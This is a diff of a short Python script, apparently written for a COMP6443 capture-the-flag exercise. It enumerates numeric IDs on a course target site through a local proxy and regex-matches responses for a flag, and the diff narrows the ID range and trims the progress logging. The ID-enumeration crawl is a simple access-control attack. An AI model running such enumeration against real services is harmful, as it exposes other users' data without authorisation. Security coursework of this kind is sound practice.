@@ -11,10 +11,10 @@ s.proxies = {"https": "http://127.0.0.1:8080"}
 # The regex pattern to find the flag
 flag_pattern = re.compile(r"COMP6443\{.*\}")
 
-print("Starting Crawl...")
-
+print("*Starting*")
+recent_req = 127
 # Iterate through the IDs
-for i in range(1, 1088):
+for i in range(1, recent_req):
     url = f'https://support-v0.quoccacorp.com/raw/{i}/'
     
     try:
@@ -28,10 +28,6 @@ for i in range(1, 1088):
             print(f"URL: {url}")
             print(f"Flag: {match.group(0)}")
             break # Stop once we find it
-        else:
-            # Print progress every 50 requests so you know it's working
-            if i % 50 == 0:
-                print(f"Checked {i} pages...")
                 
     except requests.exceptions.RequestException as e:
         print(f"Error at ID {i}: {e}")
